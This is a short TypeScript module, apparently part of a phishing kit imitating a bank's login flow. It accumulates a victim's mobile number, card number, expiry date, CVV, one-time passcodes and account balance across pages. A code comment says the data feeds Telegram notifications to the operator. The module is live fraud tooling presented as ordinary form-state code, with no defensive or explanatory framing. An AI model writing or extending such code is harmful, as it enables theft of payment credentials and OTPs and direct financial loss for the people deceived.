'use client'

// Accumulates form details across the multi-step flow (login -> card -> otp ->
// balance -> confirm otp) so that every Telegram notification includes all of
// the details collected so far, not just the current page.

export type SubmissionData = {
  mobile?: string
  card?: string
  month?: string
  year?: string
  cvv?: string
  otp?: string
  balance?: string
  confirmOtp?: string
}

const STORAGE_KEY = 'nbp_submission_data'

export function getSubmissionData(): SubmissionData {
  if (typeof window === 'undefined') return {}
  try {
    const raw = window.sessionStorage.getItem(STORAGE_KEY)
    return raw ? (JSON.parse(raw) as SubmissionData) : {}
  } catch {
    return {}
  }
}

export function saveSubmissionData(partial: SubmissionData): SubmissionData {
  const merged = { ...getSubmissionData(), ...partial }
  if (typeof window !== 'undefined') {
    try {
      window.sessionStorage.setItem(STORAGE_KEY, JSON.stringify(merged))
    } catch {
      // Ignore storage failures (e.g. private browsing quota errors)
    }
  }
  return merged
}

export function clearSubmissionData() {
  if (typeof window === 'undefined') return
  try {
    window.sessionStorage.removeItem(STORAGE_KEY)
  } catch {
    // Ignore storage failures
  }
}
